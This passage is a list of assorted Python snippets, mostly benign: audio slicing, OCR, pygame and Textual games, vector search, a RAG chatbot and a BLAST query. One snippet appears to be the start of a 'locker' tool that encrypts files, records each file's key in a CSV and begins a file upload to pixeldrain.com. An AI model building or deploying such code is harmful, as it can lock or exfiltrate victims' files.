looping while frame is silent.\n            if rms < self.threshold:\n                # Record start of silent frames.\n                if silence_start is None:\n                    silence_start = i\n                continue\n            # Keep looping while frame is not silent and silence start has not been recorded.\n            if silence_start is None:\n                continue\n            # Clear recorded silence start if interval is not enough or clip is too short\n            is_leading_silence = silence_start == 0 and i > self.max_sil_kept\n            need_slice_middle = i - silence_start >= self.min_interval and i - clip_start >= self.min_length\n            if not is_leading_silence and not need_slice_middle:\n                silence_start = None\n                continue\n            # Need slicing. Record the range of silent frames to be removed.\n            if i - silence_start <= self.max_sil_kept:\n                pos = rms_list[silence_start: i + 1].argmin() + silence_start\n                if silence_start == 0:\n                    sil_tags.append((0, pos))\n                else:\n                    sil_tags.append((pos, pos))\n                clip_start = pos\n            elif i - silence_start <= self.max_sil_kept * 2:\n                pos = rms_list[i - self.max_sil_kept: silence_start + self.max_sil_kept + 1].argmin()\n                pos += i - self.max_sil_kept\n                pos_l = rms_list[silence_start: silence_start + self.max_sil_kept + 1].argmin() + silence_start\n                pos_r = rms_list[i - self.max_sil_kept: i + 1].argmin() + i - self.max_sil_kept\n                if silence_start == 0:\n                    sil_tags.append((0, pos_r))\n                    clip_start = pos_r\n                else:\n                    sil_tags.append((min(pos_l, pos), max(pos_r, pos)))\n                    clip_start = max(pos_r, pos)\n            else:\n                pos_l = rms_list[silence_start: silence_start + self.max_sil_kept + 1].argmin() + silence_start\n                pos_r = rms_list[i - self.max_sil_kept: i + 1].argmin() + i - self.max_sil_kept\n           ",
    "from PIL import Image # pip install pillow\nimport cv2 # pip install opencv-python\nimport pytesseract # pip install pytesseract\n\ndef preprocess_image(image):\n    # Muunna kuva harmaas\u00e4vyiseksi\n    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n\n    # Melun v\u00e4hent\u00e4miseksi k\u00e4ytet\u00e4\u00e4n Gaussin sumennusta\n    blur = cv2.GaussianBlur(gray, (5,5), 0)\n\n    # Otsun kynnysarvo laskee automaattisesti parhaan kynnysarvon, joka erottaa etualan (tekstin) taustasta\n    _, binary = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)\n\n    return binary\n\ndef recognize_text_from_image(image):\n    # Muunna OpenCV-kuva (numpy-taulukko) PIL-kuvaan\n    image = Image.fromarray(image)\n\n    # M\u00e4\u00e4rit\u00e4 Tesseractin asetukset\n    # T\u00e4ss\u00e4 k\u00e4yt\u00e4mme OCR Engine Mode 3 (oletusasetus) ja Page Segmentation Mode 6 (oletetaan yhten\u00e4inen tekstilohko)\n    config = '--oem 3 --psm 6'\n    \n    text = pytesseract.image_to_string(image)\n    return text\n\ndef recognize_text_from_video(video_path, skip_frames=1):\n    # Avaa video\n    vidcap = cv2.VideoCapture(video_path)\n\n    if not vidcap.isOpened():\n        # Videon avaaminen ep\u00e4onnistui\n        print(f\"Error opening video file: {video_path}\")\n        return\n\n    frame_count = 0\n\n    # Lue video ruutu kerrallaan\n    while True:\n        # Lue seuraava ruutu\n        success, image = vidcap.read()\n        if not success:\n            break\n\n        # Jos skip_frames on 1, k\u00e4sitell\u00e4\u00e4n jokaista ruutua\n        if frame_count % skip_frames == 0:\n            image = preprocess_image(image)\n            text = recognize_text_from_image(image)\n            print(text)\n\n        frame_count += 1\n\n    # Sulje video\n    vidcap.release()",
    "import sys\nimport cfg\nimport pygame\nimport random\n\nclass SkierClass(pygame.sprite.Sprite):\n    def __init__(self):\n        pygame.sprite.Sprite.__init__(self)\n        self.direction = 0\n        self.imagepaths = cfg.SKIER_IMAGE_PATHS[:-1]\n        self.image = pygame.image.load(self.imagepaths[self.direction])\n        self.rect = self.image.get_rect()\n        self.rect.center = [320, 100]\n        self.speed = [self.direction, 6-abs(self.direction)*2]\n        \n    def turn(self, num):\n        self.direction += num\n        self.direction = max(-2, self.direction)\n        self.direction = min(2, self.direction)\n\n        center = self.rect.center\n        self.image = pygame.image.load(self.imagepaths[self.direction])\n        self.rect = self.image.get_rect()\n        self.rect.center = center\n        self.speed = [self.direction, 6-abs(self.direction)*2]\n        return self.speed\n        \n    def move(self):\n        self.rect.centerx += self.speed[0]\n        self.rect.centerx = max(20, self.rect.centerx)\n        self.rect.centerx = min(620, self.rect.centerx)\n\n    def setFall(self):\n        self.image = pygame.image.load(cfg.SKIER_IMAGE_PATHS[-1])\n            \n    def setForward(self):\n        self.direction = 0\n        self.image = pygame.image.load(self.imagepaths[self.direction])\n\nclass ObstacleClass(pygame.sprite.Sprite):\n    def __init__(self, img_path, location, attribute):\n        pygame.sprite.Sprite.__init__(self)\n        self.img_path = img_path\n        self.image = pygame.image.load(self.img_path)\n        self.location = location\n        self.rect = self.image.get_rect()\n        self.rect.center = self.location\n        self.attribute = attribute\n        self.passed = False\n    \n    def move(self, num):\n        self.rect.centery = self.location[1] - num\n\ndef createObstacles(s, e, num=10):\n    obstacles = pygame.sprite.Group()\n    locations = []\n\n    for i in range(num):\n        row = random.randint(s, e)\n        col = random.randint(0, 9)\n        location = [col*64+20, row*64+20]\n        if location not in locations:\n            locations.append(location)\n            attribute = random.choice(list(cfg.OBSTACLE_PATHS))\n            img_path = cfg.OBSTACLE_PATHS[attribute]\n            obstacle = ObstacleClass(img_path, location, attribute)\n            obstacles.add(obstacle)\n    return obstacles\n\ndef AddObstacles(obstacles0, obstacles1):\n    obstacles = pygame.sprite.Group()\n    for obstacle in obstacles0:\n        obstacles.add(obstacle)\n    for obstacle in obstacles1:\n        obstacles.add(obstacle)\n    return obstacles\n\ndef ShowStartInterface(screen, screensize):\n    screen.fill((255, 255, 255))\n    tfont = pygame.font.Font(cfg.FONTPATH, screensize[0]//5)\n    cfont = pygame.font.Font(cfg.FONTPATH, screensize[0]//20)\n    title = tfont.render(u'Skier Game', True, (255, 0, 0))\n    content = cfont.render(u'Press any key to START', True, (0, 0, 255))\n    trect = title.get_rect()\n    trect.midtop = (screensize[0]/2, screensize[1]/5)\n    crect = content.get_rect()\n    crect.midtop = (screensize[0]/2, screensize[1]/2)\n    screen.blit(title, trect)\n    screen.blit(content, crect)\n\n    while True:\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n                sys.exit()\n            elif event.type == pygame.KEYDOWN:\n                return\n        pygame.display.update()\n\ndef showScore(screen, score, pos=(10, 10)):\n    font = pygame.font.Font(cfg.FONTPATH, 30)\n    score_text = font.render(\"Score: %s\" % score, True, (0, 0, 0))\n    screen.blit(score_text, pos)\n\ndef updateFrame(screen, obstacles, skier, score):\n    screen.fill((255, 255, 255))\n    obstacles.draw(screen)\n    screen.blit(skier.image, skier.rect)\n    showScore(screen, score)\n    pygame.display.update()\n\ndef initGame():\n    pygame.init()\n    game_sounds = {}\n    for key, value in cfg.AUDIO_PATHS.items():\n        if key == 'bgm': continue\n        game_sounds[key] =pygame.mixer.Sound(value)\n\n    return game_sounds\n\ndef main():\n    game_sounds = initGame()\n    pygame.mixer.init()\n    pygame.mixer.music.load(cfg.AUDIO_PATHS['bgm'])\n    pygame.mixer.music.set_volume(0.9)\n    pygame.mixer.music.play(-1, 0.0)\n   \n    screen = pygame.display.set_mode(cfg.SCREENSIZE)\n    pygame.display.set_caption('Skier Game')\n\n    ShowStartInterface(screen, cfg.SCREENSIZE)\n\n    skier = SkierClass()\n    obstacles0 = createObstacles(20, 29)\n    obstacles1 = createObstacles(10, 19)\n    obstaclesflag = 0\n    obstacles = AddObstacles(obstacles0, obstacles1)\n\n    clock = pygame.time.Clock()\n    distance = 0\n    score = 0\n    speed = [0, 6]\n\n    while True:\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n                sys.exit()\n            if event.type == pygame.KEYDOWN:\n                if event.key == pygame.K_LEFT or event.key == pygame.K_a:\n                    speed = skier.turn(-1)\n                elif event.key == pygame.K_RIGHT or event.key == pyg",
    "import numpy as np\nfrom qdrant_client import QdrantClient\nfrom qdrant_client.models import Distance, PointStruct, VectorParams\n\nclient = QdrantClient(path=\"image_db\")  # Persists changes to disk\n\n\n# client.recreate_collection(\n#     collection_name=\"meme_collection\",\n#     vectors_config=VectorParams(size=512, distance=Distance.COSINE),\n# )\n\n\n# data = np.load(\"embeddings/image_embeddings.npz\")\n\n# vectors = data['embeddings'].tolist()\n# image_files = data['image_files'].tolist()\n\n# for i in range(len(image_files)):\n#     idx = i\n#     vector = vectors[i]\n#     image_file = image_files[i]\n#     client.upsert(\n#         collection_name=\"meme_collection\",\n#         points=[PointStruct(id=idx, vector=vector, payload={\"image_file\": image_file})],\n#     )\n\nquery_vector = np.load(\"bird_embeddings.npy\")[0]\nprint(query_vector.shape)\n\nhits = client.search(\n    collection_name=\"meme_collection\",\n    query_vector=query_vector,\n    limit=5,  # Return 5 closest points\n)\n\nfor i in hits:\n    print(i.id, i.payload)\n    print()\n",
    "import random\r\n\r\nhands = ['rock', 'scissors', 'paper']\r\nresults = {'win': 'you win', 'lose': 'you lose', 'draw': 'draw try again'}\r\n\r\ndef start_message():\r\n    print('Start \\'rock-paper-scissors\\'')\r\n\r\ndef get_player():\r\n    print('Input your hand')\r\n    input_message = ''\r\n    index = 0\r\n    for hand in hands:\r\n        input_message += str(index) + ':' + hand\r\n        if index < 2:\r\n            input_message += ', '\r\n        index += 1\r\n    return int(input(input_message))\r\n\r\n\r\ndef get_computer():\r\n    return random.randint(0, 2)\r\n\r\ndef get_hand_name(hand_number):\r\n    return hands[hand_number]\r\n\r\ndef view_hand(your_hand, computer_hand):\r\n    print('My hand is ' + get_hand_name(your_hand))\r\n    print('Computer\\'s hand is ' + get_hand_name(computer_hand))\r\n    \r\n\r\ndef get_result(hand_diff):\r\n    if hand_diff == 0:\r\n        return 'draw'\r\n    elif hand_diff == -1 or hand_diff == 2:\r\n        return 'win'\r\n    else:\r\n        return 'lose'\r\n\r\ndef view_result(result):\r\n    print(results[result])\r\n\r\ndef play():\r\n    your_hand = get_player()\r\n    computer_hand = get_computer()\r\n    hand_diff = (your_hand - computer_hand) % 3\r\n\r\n    view_hand(your_hand, computer_hand)\r\n    result = get_result(hand_diff)\r\n    view_result(result)\r\n\r\n    if result == 'draw':\r\n        print()\r\n        play()\r\n\r\nstart_message()\r\nplay()\r\n\r\n\r\n",
    "from dotenv import load_dotenv\r\nimport os\r\n\r\nload_dotenv()\r\n\r\nfrom langchain_openai import ChatOpenAI\r\nfrom langchain_core.prompts import ChatPromptTemplate\r\nfrom langchain.chains.combine_documents import create_stuff_documents_chain\r\nfrom langchain_openai import OpenAIEmbeddings\r\nfrom langchain_community.vectorstores.faiss import FAISS\r\nfrom langchain.chains import create_retrieval_chain\r\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\r\n# Conversation imports\r\nfrom langchain_core.prompts import MessagesPlaceholder\r\nfrom langchain_core.messages import HumanMessage, AIMessage\r\nfrom langchain.chains.history_aware_retriever import create_history_aware_retriever\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\nimport nltk\r\nfrom nltk.corpus import stopwords\r\nfrom nltk.tokenize import word_tokenize\r\nfrom nltk.stem import WordNetLemmatizer\r\nimport string\r\n\r\n# Download NLTK resources\r\nnltk.download('punkt')\r\nnltk.download('stopwords')\r\nnltk.download('wordnet')\r\n\r\nembeddings_dir = os.path.join(\"embeddings\")\r\nos.makedirs(embeddings_dir, exist_ok=True)\r\napi_key=\"Enter api key\"\r\n\r\n\r\ndef preprocess_text(text):\r\n    # Tokenize the text\r\n    tokens = word_tokenize(text)\r\n\r\n    # Remove punctuation\r\n    tokens = [token for token in tokens if token not in string.punctuation]\r\n\r\n    # Remove stopwords\r\n    stop_words = set(stopwords.words('english'))\r\n    tokens = [token for token in tokens if token.lower() not in stop_words]\r\n\r\n    # Lemmatization\r\n    lemmatizer = WordNetLemmatizer()\r\n    tokens = [lemmatizer.lemmatize(token) for token in tokens]\r\n\r\n    # Join tokens back into a string\r\n    preprocessed_text = ' '.join(tokens)\r\n\r\n    return preprocessed_text\r\n\r\ndef scrape_website(url):\r\n    # response = requests.get(url)\r\n    response = requests.get(url, timeout=10)  # Timeout set to 10 seconds\r\n    soup = BeautifulSoup(response.text, 'html.parser')\r\n    text = \"\"\r\n    for tag in soup.find_all(['p', 'h1', 'h2', 'h3', 'ul', 'ol']):\r\n        text += tag.get_text(strip=True) + \" \"\r\n\r\n    # Preprocess the text\r\n    text = preprocess_text(text)\r\n    # Store the text into a file\r\n    file_path = os.path.join(os.getcwd(), \"scraped_text.txt\")\r\n    with open(file_path, \"w\", encoding=\"utf-8\") as file:\r\n        file.write(text)\r\n    return file_path,file\r\n\r\ndef create_embeddings_and_save(file, embeddings_dir, api_key):\r\n    file_name = os.path.basename(file)\r\n    embedding_filename = os.path.splitext(file_name)[0] + \".pkl\"\r\n    embedding_path = os.path.join(embeddings_dir, embedding_filename)\r\n    if os.path.exists(embedding_path):\r\n        print(f\"Embeddings already present for {file_name}: {embedding_filename}\")\r\n        return embedding_filename\r\n    else:\r\n        with open(file, \"r\", encoding=\"utf-8\") as f:\r\n            text = f.read()  # Read the content of the text file\r\n        splitter = RecursiveCharacterTextSplitter(chunk_size=1000, chunk_overlap=200)\r\n        text_chunks = splitter.create_documents([text])  # Use the text here instead of pdf_text\r\n\r\n        embeddings = OpenAIEmbeddings(api_key=api_key, model=\"text-embedding-3-small\")\r\n        vector_index = FAISS.from_documents(text_chunks, embeddings)\r\n        serialized_db = vector_index.serialize_to_bytes()\r\n        with open(embedding_path, \"wb\") as f:\r\n            f.write(serialized_db)\r\n        print(f\"Created embeddings for `{file_name}` and saved it to `{embedding_path}`\")\r\n        return embedding_filename\r\ndef load_embeddings(file):\r\n    embeddings = OpenAIEmbeddings(model=\"text-embedding-3-small\")\r\n\r\n    with open(file, \"rb\") as f:\r\n        pkl = f.read()\r\n\r\n    vectorStore = FAISS.deserialize_from_bytes(\r\n        serialized=pkl,\r\n        embeddings=embeddings\r\n    )\r\n    print(\"Embeddings loaded Now you can chat with your Document\")\r\n    return vectorStore\r\n\r\n\r\ndef trim_chat_history(chat_history):\r\n    return chat_history[-10:]\r\n\r\n\r\ndef create_chain(vectorStore):\r\n    model = ChatOpenAI(\r\n        model=\"gpt-3.5-turbo-1106\",\r\n        temperature=0.2\r\n    )\r\n    prompt = ChatPromptTemplate.from_messages([\r\n        (\"system\",\r\n         \"Answer the question below only from the text provided. Answer in detail and in a friendly, enthusiastic tone. If related data doesn't lies in the context, don't try to make answers by your own: {context}\"),\r\n        MessagesPlaceholder(variable_name=\"chat_history\"),\r\n        (\"user\", \"{input}\")\r\n    ])\r\n\r\n    # chain = prompt | model\r\n    chain = create_stuff_documents_chain(\r\n        llm=model,\r\n        prompt=prompt\r\n    )\r\n\r\n    retriever = vectorStore.as_retriever(search_kwargs={\"k\": 3})\r\n\r\n    retriever_prompt = ChatPromptTemplate.from_messages([\r\n        MessagesPlaceholder(variable_name=\"chat_history\"),\r\n        (\"user\", \"{input}\"),\r\n        (\"user\",\r\n         \"Given the above conversation, generate a search query to look up in order to get information relevant to the conversation\")\r\n    ])\r\n\r\n    history_aware_retriever = create_history_aware_retriever(\r\n        llm=model,\r\n        retriever=retriever,\r",
    "# Homo sapiens chromosome 6, GRCh38.p14 Primary Assembly is used as an example\r\n# NCBI Reference Sequence: NC_000006.12\r\n# https://www.ncbi.nlm.nih.gov/nuccore/NC_000006.12?report=fasta&from=27866792&to=27867588&strand=true\r\n\r\n# 1. libraries and data import\r\nimport time\r\nimport datetime\r\nfrom Bio.Blast import NCBIWWW\r\nfrom Bio.Blast import NCBIXML\r\nfrom Bio import SeqIO\r\nimport os\r\n\r\n# 2. enter variables\r\nstart_time = time.time()\r\nend_time = time.time()\r\nNCBIWWW.email = '' # there should be an email here \r\n\r\n# 3. send a request to BLAST, write the result to an XML file\r\nwdir = os.getcwd()\r\nrecord = SeqIO.read(handle='sequence.fasta', format='fasta')\r\nrequest = NCBIWWW.qblast(\"blastn\", \"nt\", record.format(\"fasta\"))\r\n\r\nwith open('blast_result.xml', 'w+') as add_to:\r\n    add_to.write(request.read())\r\n    request.close()\r\n\r\n# 4. output the result and program execution time\r\nprint(f'Time used: {end_time - start_time}.')\r\n\r\nresult_handle = open('blast_result.xml', 'r')\r\nblast_record = NCBIXML.read(result_handle)\r\nE_VALUE_THRESH = 0.001\r\nfor alignment in blast_record.alignments:\r\n    for hsp in alignment.hsps:\r\n        if hsp.expect < E_VALUE_THRESH:\r\n            print('****Alignment****')\r\n            print('Sequence:', alignment.title)\r\n            print('Sequence length:', alignment.length)\r\n            print('E-value:', hsp.expect)\r\n            print(hsp.query[0:75] + '...')\r\n            print(hsp.match[0:75] + '...')\r\n            print(hsp.sbjct[0:75] + '...')\r\n\r\n\r\n# 5. copy XML request file to target_url repository\r\n\r\noriginal_file_path = '' # there should be the path to the original file\r\ncurrent_date = datetime.datetime.now() # current time and date\r\n\r\n# create a new filename based on the date and time\r\nnew_file_name = current_date.strftime('%Y-%m-%d_%H-%M-%S') + '.xml'\r\n\r\n# duplicate the file to the new location\r\nnew_file_path = os.path.join('C:\\\\', new_file_name) # there should be the destination directory path\r\nos.makedirs(os.path.dirname(new_file_path), exist_ok=True)\r\nwith open(original_file_path, 'rb') as original_file:\r\n    with open(new_file_path, 'wb') as new_file:\r\n        new_file.write(original_file.read())\r\n\r\n'''                   ! optional element !\r\nif __name__ == '__main__':\r\n    pass\r\n'''\r\n",
    "import os\nimport csv\nimport base64\nimport requests\nfrom conf import param\nfrom cryptography.fernet import Fernet\n\n\ndef banner():\n    print(\"\")\n    print(\"\\033[95m\"+r\"              \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"+\"\\033[0m                                                               \")\n    print(\"\\033[95m\"+r\"        \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588      \u2588\u2588\u2588\u2588\u2588       \u2588\u2588\"+\"\\033[0m                                                         \")\n    print(\"\\033[95m\"+r\"     \u2588\u2588\u2588\u2588\u2588          \u2588\u2588\u2588\u2588        \u2588\u2588\u2588\"+\"\\033[0m                                                          \")\n    print(\"\\033[95m\"+r\"   \u2588\u2588\u2588            \u2588\u2588\u2588          \u2588\u2588\u2588\u2588\u2588\"+\"\\033[0m                                                         \")\n    print(\"\\033[95m\"+r\" \u2588\u2588\u2588           \u2588\u2588\u2588\u2588\u2588          \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"+\"\\033[0m                                                       \")\n    print(\"\\033[95m\"+r\"\u2588\u2588            \u2588\u2588\u2588\u2588\u2588\u2588          \u2588\u2588    \u2588\u2588\u2588\"+\"\\033[0m                                                      \")\n    print(\"\\033[95m\"+r\"            \u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588        \u2588\u2588\u2588    \u2588\u2588\"+\"\\033[0m                                                      \")\n    print(\"\\033[95m\"+r\"           \u2588\u2588\u2588      \u2588\u2588\u2588\u2588\u2588           \u2588\u2588\u2588\"+\"\\033[0m                                                      \")\n    print(\"\\033[95m\"+r\"          \u2588\u2588\u2588     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"+\"\\033[0m                                                       \")\n    print(\"\\033[95m\"+r\"         \u2588\u2588\u2588      \u2588\u2588\u2588     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"+\"\\033[0m                                                          \")\n    print(\"\\033[95m\"+r\"         \u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588\u2588\u2588\"+\"\\033[0m\"+\"\\033[97m\"+r\"            ;-. \"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"   ,   \"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\" ,  \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\"     \")\n    print(\"\\033[95m\"+r\"        \u2588\u2588\u2588    \u2588\u2588      \u2588\u2588\u2588\"+\"\\033[0m\"+\"\\033[97m\"+r\"               |  )\"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"   |   \"+\"\\033[0m\"+\"\\033[95m\"+r\"    \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\" |  \"+\"\\033[0m\"+\"\\033[97m\"+r\"    \"+\"\\033[0m\"+\"\\033[95m\"+r\"     \")\n    print(\"\\033[95m\"+r\"        \u2588\u2588     \u2588      \u2588\u2588\u2588\"+\"\\033[0m\"+\"\\033[97m\"+r\"                |-' \"+\"\\033[0m\"+\"\\033[95m\"+r\" ,-:\"+\"\\033[0m\"+\"\\033[97m\"+r\" ,-,\"+\"\\033[0m\"+\"\\033[95m\"+r\" . .\"+\"\\033[0m\"+\"\\033[97m\"+r\" ,-,\"+\"\\033[0m\"+\"\\033[95m\"+r\" . .\"+\"\\033[0m\"+\"\\033[97m\"+r\"   |   \"+\"\\033[0m\"+\"\\033[95m\"+r\" ,-.\"+\"\\033[0m\"+\"\\033[97m\"+r\" ,-.\"+\"\\033[0m\"+\"\\033[95m\"+r\" | ,\"+\"\\033[0m\"+\"\\033[97m\"+r\" ,-.\"+\"\\033[0m\"+\"\\033[95m\"+r\" ;-. \")\n    print(\"\\033[95m\"+r\"        \u2588\u2588      \u2588     \u2588\u2588\"+\"\\033[0m\"+\"\\033[97m\"+r\"                 |   \"+\"\\033[0m\"+\"\\033[95m\"+r\" | |\"+\"\\033[0m\"+\"\\033[97m\"+r\"  / \"+\"\\033[0m\"+\"\\033[95m\"+r\" | |\"+\"\\033[0m\"+\"\\033[97m\"+r\"  / \"+\"\\033[0m\"+\"\\033[95m\"+r\" | |\"+\"\\033[0m\"+\"\\033[97m\"+r\"   |   \"+\"\\033[0m\"+\"\\033[95m\"+r\" | |\"+\"\\033[0m\"+\"\\033[97m\"+r\" |  \"+\"\\033[0m\"+\"\\033[95m\"+r\" |< \"+\"\\033[0m\"+\"\\033[97m\"+r\" |-'\"+\"\\033[0m\"+\"\\033[95m\"+r\" |   \")\n    print(\"\\033[95m\"+r\"         \u2588            \u2588\u2588\"+\"\\033[0m\"+\"\\033[97m\"+r\"                 '   \"+\"\\033[0m\"+\"\\033[95m\"+r\" `-`\"+\"\\033[0m\"+\"\\033[97m\"+r\" '-'\"+\"\\033[0m\"+\"\\033[95m\"+r\" `-`\"+\"\\033[0m\"+\"\\033[97m\"+r\" '-'\"+\"\\033[0m\"+\"\\033[95m\"+r\" `-`\"+\"\\033[0m\"+\"\\033[97m\"+r\"   `--'\"+\"\\033[0m\"+\"\\033[95m\"+r\" `-'\"+\"\\033[0m\"+\"\\033[97m\"+r\" `-'\"+\"\\033[0m\"+\"\\033[95m\"+r\" ' `\"+\"\\033[0m\"+\"\\033[97m\"+r\" `-'\"+\"\\033[0m\"+\"\\033[95m\"+r\" '   \")\n    print(\"\\033[95m\"+r\"                      \u2588\u2588\"+\"\\033[0m                                                                     \")\n    print(\"\\033[95m\"+r\"                      \u2588\u2588\u2588\"+\"\\033[0m\"+\"\\033[97m\"+r\"                                \ud835\udd2b\ud835\udd2c\ud835\udd31 \ud835\udd23\ud835\udd2c\ud835\udd2f \ud835\udd26\ud835\udd29\ud835\udd29\ud835\udd22\ud835\udd24\ud835\udd1e\ud835\udd29 \ud835\udd2d\ud835\udd32\ud835\udd2f\ud835\udd2d\ud835\udd2c\ud835\udd30\ud835\udd22                 \")\n    print(\"\\033[95m\"+r\"                       \u2588\u2588\u2588\"+\"\\033[0m\"+\"\\033[95m\"+r\"                             \ud835\udd25\ud835\udd31\ud835\udd31\ud835\udd2d\ud835\udd30://\ud835\udd24\ud835\udd26\ud835\udd31\ud835\udd25\ud835\udd32\ud835\udd1f.\ud835\udd20\ud835\udd2c\ud835\udd2a/\ud835\udd2b\ud835\udd1e\ud835\udd31\ud835\udd22\ud835\udd28\ud835\udd1e\ud835\udd29\ud835\udd26               \")\n    print(\"\\033[95m\"+r\"                        \u2588\u2588\u2588\"+\"\\033[0m                                                                  \")\n    print(\"\\033[95m\"+r\"                          \u2588\u2588\u2588\"+\"\\033[0m                                                                \")\n    print(\"\\033[95m\"+r\"                            \u2588\u2588\u2588\"+\"\\033[0m                                                              \")\n    print(\"\")\n\n\ndef check_conf():\n    if param['start_dir'] == 'CHANGE_HERE':\n        return False\n    elif param['tmp_csv'] == 'CHANGE_HERE':\n        return False\n    else:\n        return True\n\n\ndef encryptor(data, key):\n    cipher = Fernet(key)\n    e_data = cipher.encrypt(data)\n    return e_data\n\n\ndef gen_key():\n    key = Fernet.generate_key()\n    return key\n\n\ndef to_csv(csv_file, filepath, key):\n    with open(csv_file, mode='a', newline='') as file:\n        csv_w = csv.writer(file)\n        key_b64 = base64.b64encode(key).decode('utf-8')\n        csv_w.writerow([filepath, key_b64])\n\n\ndef upload_px(filepath):\n    url = \"https://pixeldrain.com/api/file\"",
    "from textual.app import App, ComposeResult \nfrom textual.screen import Screen\nfrom textual.reactive import reactive\nfrom textual.containers import Container , Center, ScrollableContainer\nfrom textual.widgets import Header, Footer , Button , Static, Label , Input , Digits, DataTable\nimport art\nimport keyboard\nimport time\n\n\n\nROWS = [\n    (\"lane\", \"swimmer\", \"country\", \"time\"),\n    (4, \"Joseph Schooling\", \"Singapore\", 50.39),\n    (2, \"Michael Phelps\", \"United States\", 51.14),\n    (5, \"Chad le Clos\", \"South Africa\", 51.14),\n    (6, \"L\u00e1szl\u00f3 Cseh\", \"Hungary\", 51.14),\n    (3, \"Li Zhuhao\", \"China\", 51.26),\n    (8, \"Mehdy Metella\", \"France\", 51.58),\n    (7, \"Tom Shields\", \"United States\", 51.73),\n    (1, \"Aleksandr Sadovnikov\", \"Russia\", 51.84),\n    (10, \"Darren Burns\", \"Scotland\", 51.84),\n]\n\n\nclass ResultScreen(Screen):\n    \"The analytics screen\"\n    CSS_PATH=\"ResultScreen.tcss\"\n    BINDINGS = [(\"d\", \"toggle_dark\", \"Toggle dark mode\") ,(\"escape\", \"app.pop_screen('resultscreen')\", \"Pop Screen\")]\n\n\n\n    def compose(self) -> ComposeResult:\n        \"\"\"Create child widgets for the analytics screen.\"\"\"\n        yield Header()\n        with Center():\n            yield Label(\"your score is : 90\" , id=\"score\")\n        with Center():\n            yield Label(\"Stats:\" , id=\"statsTitle\")\n        \n        yield Container(            \n            ScrollableContainer(\n                DataTable( id=\"table\"),\n                id=\"tableScrollContainer\"\n            ),\n            Center(\n            Label(\"Your wpm is: 90\" , id=\"wmp\"),\n            id=\"wpmContainer\")\n            , id=\"statsContainer\"\n        )\n\n    def on_mount(self) -> None:\n        table = self.query_one(DataTable)\n        table.add_columns(*ROWS[0])\n        table.add_rows(ROWS[1:])\n\n\n\n\nclass GameScreen(Screen):\n    \"The Gameplay screen\"\n    CSS_PATH=\"GameScreen.tcss\"\n    BINDINGS = [(\"escape\", \"app.pop_screen('gamescreen')\", \"Back To Main Menu\") ,(\"d\", \"toggle_dark\", \"Toggle Dark Mode\") ]\n    words = [\"happy\" , \"sad\" , \"bad\" , \"meets\" , \"evil\"] \n\n \n\n    \n    def compose(self) -> ComposeResult:\n        \"\"\"Create child widgets for the game screen.\"\"\"\n        yield Header()\n        yield Digits(\"100000\" , id=\"timer\")\n        yield Container(\n            Label(\"Type this:\" , id=\"Instruction\"),\n            Label(self.writtenWord , id=\"gameWord\"),\n            Container( Input(placeholder=\"type here...\", id=\"userInput\"), classes=\"inputContainer\" ),\n            classes=\"containerGame\"\n        ) \n        yield Footer()\n\n\n\n\nclass TypingCoach(App):\n    \"\"\"An app to help you typer faster.\"\"\"\n    CSS_PATH=\"MainScreen.tcss\"\n    BINDINGS = [(\"d\", \"toggle_dark\", \"Toggle dark mode\")]\n    \n    def on_button_pressed(self, event: Button.Pressed) -> None:\n        \"\"\"Event handler called when start button is pressed.\"\"\"\n        if event.button.id == \"gameStartButton\":\n            self.push_screen(GameScreen())\n\n\n    def compose(self) -> ComposeResult:\n        \"\"\"Create child widgets for the app.\"\"\"\n        yield Header()\n        with Container(id=\"mainContainer\"):\n            with Center():\n                yield Label(art.text2art(\"TypingCoach\" , font=\"doom\") , id=\"mainTitle\")\n            with Center():\n                yield Label(\"A game that will me you type faster using the power of python and data analytics\" , id=\"description\")\n            with Center():\n                yield Button(\"Start\" , id=\"gameStartButton\" , variant=\"success\")\n        yield Footer()\n\n    def action_toggle_dark(self) -> None:\n        \"\"\"An action to toggle dark mode.\"\"\"\n        self.dark = not self.dark\n\n\nif __name__ == \"__main__\":\n    app = TypingCoach()\n    app.run()\n",
